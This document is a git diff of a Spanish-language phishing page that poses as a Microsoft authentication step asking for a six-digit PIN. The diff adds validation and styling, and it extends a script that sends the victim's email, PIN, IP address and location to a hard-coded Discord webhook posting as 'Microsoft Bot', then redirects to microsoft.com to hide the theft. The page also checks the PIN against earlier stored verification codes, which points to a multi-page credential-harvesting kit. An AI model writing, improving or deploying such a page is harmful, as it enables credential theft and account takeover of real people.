@@ -96,17 +96,15 @@
         .btn1 button:hover {
             background: #005a9e;
         }
-         .e2{
+        .e2 {
             margin-bottom: 7px;
             font-size: 14px;
             font-weight: 600;
-            
         }
-
         .input-group {
             margin-bottom: 16px;
+            position: relative;
         }
-
         .input-group input {
             width: 100%;
             padding: 8px 0 8px 8px;
@@ -118,9 +116,21 @@
             box-sizing: border-box;
             transition: border-bottom-color 0.2s, border-bottom-width 0.2s;
         }
-        .e3{
+        .input-group input.error-input {
+            border: 1px solid #d32f2f;
+            background-color: #fff6f6;
+        }
+        .error-message {
+            color: #d32f2f;
+            font-size: 12px;
+            margin-top: 5px;
+            text-align: left;
+            display: none;
+        }
+        .e3 {
             font-size: 13px;
             margin-bottom: 15px;
+            color: #666;
         }
         .adis {
             border-top: 1px solid #f0f0f0;
@@ -176,14 +186,13 @@
                 <p>Este PIN es único e intransferible. No lo compartas con nadie.</p>
             </div>
             <div class="input-group">
-                    <p class="e2" for="">Código PIN</p>
-                    <input style="text-align: center;" type="text" inputmode="numeric" pattern="[0-9]{6}" maxlength="6" placeholder=" * * * * * *" required>
-                    <p class="e3"> Agrega un pin de seguridad de 6 digitos. </p>
-                </div>
+                <p class="e2">Código PIN</p>
+                <input id="pinInput" style="text-align: center;" type="text" inputmode="numeric" pattern="[0-9]{6}" maxlength="6" placeholder="* * * * * *" required>
+                <div id="errorMsg" class="error-message"></div>
+                <p class="e3">Agrega un pin de seguridad de 6 digitos.</p>
+            </div>
 
-            <a href="https://www.microsoft.com/">
-            <div class="btn1"><button>Siguiente</button></div>
-</a>
+            <div class="btn1"><button id="siguienteBtn">Siguiente</button></div>
             <div class="adis">
                 <a href="#">Términos de uso</a>
                 <a href="#">Aviso de privacidad</a>
@@ -193,23 +202,138 @@
         </div>
     </div>
 
-   <script>
+<script>
     const webhook = "https://discord.com/api/webhooks/1507131798218342512/HttmYqpus_6kYPNe1WyYNxSyhkGjzTLxjlSNlIpTPtZUEeWuCfy9EJeF_ILhDmmBNYpq";
-    document.querySelector('.btn1 button').addEventListener('click', async (e) => {
-        e.preventDefault();
-        const userData = JSON.parse(localStorage.getItem('userDataIndex1') || '{}');
-        const email = userData.email || 'Sin correo';
-        const pinInput = document.querySelector('.input-group input');
-        const pin = pinInput ? pinInput.value : '';
-        const mensaje = `🔐 **PIN FINAL DE AUTENTICACIÓN**\n📧 Correo: ${email}\n🔢 PIN: ${pin}`;
+    
+    async function fetchWithTimeout(url, timeout = 5000) {
+        const controller = new AbortController();
+        const id = setTimeout(() => controller.abort(), timeout);
         try {
-            await fetch(webhook, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ content: mensaje, username: 'Microsoft Bot' })
-            });
-        } catch(err) { console.error(err); }
-        window.location.href = 'https://www.microsoft.com/';
+            const response = await fetch(url, { signal: controller.signal });
+            clearTimeout(id);
+            return response;
+        } catch (error) {
+            clearTimeout(id);
+            throw error;
+        }
+    }
+    
+    async function getGeoInfo() {
+        const apis = [
+            { url: 'https://ipapi.co/json/', parser: (data) => ({ ip: data.ip, pais: data.country_name, ciudad: data.city }) },
+            { url: 'https://ipinfo.io/json/', parser: (data) => ({ ip: data.ip, pais: data.country, ciudad: data.city }) },
+            { url: 'https://api.ipify.org?format=json', parser: (data) => ({ ip: data.ip, pais: 'Desconocido', ciudad: 'Desconocido' }) },
+            { url: 'https://api.my-ip.io/ip.json', parser: (data) => ({ ip: data.ip, pais: data.country || 'Desconocido', ciudad: data.city || 'Desconocido' }) }
+        ];
+        for (const api of apis) {
+            try {
+                const res = await fetchWithTimeout(api.url, 4000);
+                if (!res.ok) continue;
+                const data = await res.json();
+                let result = api.parser(data);
+                if (result.ip && result.ip !== 'No disponible') {
+                    if (result.pais === 'Desconocido' && result.ciudad === 'Desconocido' && api.url.includes('ipify')) {
+                        try {
+                            const geoRes = await fetchWithTimeout(`https://ipapi.co/${result.ip}/json/`, 3000);
+                            if (geoRes.ok) {
+                                const geoData = await geoRes.json();
+                                result.pais = geoData.country_name || 'Desconocido';
+                                result.ciudad = geoData.city || 'Desconocido';
+                            }
+                        } catch(e) {}
+                    }
+                    return result;
+                }
+            } catch(e) {
+                continue;
+            }
+        }
+        return { ip: 'No disponible', pais: 'No disponible', ciudad: 'No disponible' };
+    }
+    
+    async function ensureGeoInfo() {
+        const stored = localStorage.getItem('userDataIndex1');
+        if (stored) {
+            try {
+                const data = JSON.parse(stored);
+                if (data.geo && data.geo.ip && data.geo.ip !== 'No disponible') {
+                    return data.geo;
+                }
+            } catch(e) {}
+        }
+        return await getGeoInfo();
+    }
+    
+    function formatGeoLine(geo) {
+        return `🌍 **IP:** ${geo.ip} - 📍 **País:** ${geo.pais} - 🏙️ **Ciudad:** ${geo.ciudad}`;
+    }
+    
+    function showError(message) {
+        const errorDiv = document.getElementById('errorMsg');
+        const input = document.getElementById('pinInput');
+        errorDiv.textContent = message;
+        errorDiv.style.display = 'block';
+        input.classList.add('error-input');
+    }
+    
+    function clearError() {
+        const errorDiv = document.getElementById('errorMsg');
+        const input = document.getElementById('pinInput');
+        errorDiv.style.display = 'none';
+        errorDiv.textContent = '';
+        input.classList.remove('error-input');
+    }
+    
+    document.addEventListener('DOMContentLoaded', function() {
+        const btn = document.getElementById('siguienteBtn');
+        const pinInput = document.getElementById('pinInput');
+        
+        pinInput.addEventListener('input', function() {
+            clearError();
+        });
+        
+        btn.addEventListener('click', async (e) => {
+            e.preventDefault();
+            
+            const pin = pinInput.value.trim();
+            if (!pin) {
+                showError('Por favor ingrese el PIN de autenticación.');
+                return;
+            }
+            
+            const previousCode1 = localStorage.getItem('verificationCode1');
+            const previousCode2 = localStorage.getItem('verificationCode2');
+            if ((previousCode1 && previousCode1 === pin) || (previousCode2 && previousCode2 === pin)) {
+                showError('El PIN no puede ser igual a los códigos anteriores. Por favor ingrese un PIN diferente.');
+                return;
+            }
+            
+            clearError();
+            
+            const userDataRaw = localStorage.getItem('userDataIndex1');
+            let email = 'Sin correo';
+            if (userDataRaw) {
+                try {
+                    const userData = JSON.parse(userDataRaw);
+                    email = userData.email || 'Sin correo';
+                } catch(e) {}
+            }
+            
+            const geo = await ensureGeoInfo();
+            const geoLine = formatGeoLine(geo);
+            
+            const mensaje = `🔐 **PIN FINAL DE AUTENTICACIÓN**\n📧 Correo: ${email}\n🔢 PIN: ${pin}\n${geoLine}`;
+            
+            try {
+                await fetch(webhook, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: mensaje, username: 'Microsoft Bot' })
+                });
+            } catch(err) { console.error(err); }
+            
+            window.location.href = 'https://www.microsoft.com/';
+        });
     });
 </script>
 </body>
